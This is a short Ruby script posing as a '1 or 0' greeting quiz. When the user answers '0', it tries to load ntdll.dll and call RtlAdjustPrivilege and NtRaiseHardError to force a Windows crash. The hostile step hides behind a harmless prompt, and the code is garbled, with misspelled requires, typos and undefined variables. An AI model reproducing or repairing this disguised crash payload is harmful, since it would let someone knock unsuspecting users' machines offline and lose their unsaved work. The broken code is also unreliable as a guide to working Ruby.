puts "Hello friend"
puts "Are you a 1 or a 0:"
print ">"
input = gets.chomp.strip

if input=="1"
 puts "You are a 1"
 
elsif input=="0"
      puts "Goodbye friend"
	  sleep 1 
	  
	  reqire 'fiddle'
	  reqire 'fiddle/import'
	  
	  module WinAPI
	     extend Fiddle:Importer 
		 dlload 'ntdll.dll'
		 extern 'long RtlAdjustPrivilege(unsigned long,bool,bool
		 unsigned long*)'
		 extern'long NtRaiseHardError(long,insigned long,unsigned
		 long,unsigned long, unsigned long*)'
	  end
      prev=Fiddle::Pointer.malloc(8).tap{lplp[0,8]="x00"*8}
      WinAPI.RtlAdjustPrivilege(19,1,0, prev)
      WinAPI.NtRaiseHardError(0xC0000022,0,0,0,b,prev)

else
 puts "1 or 0"
end 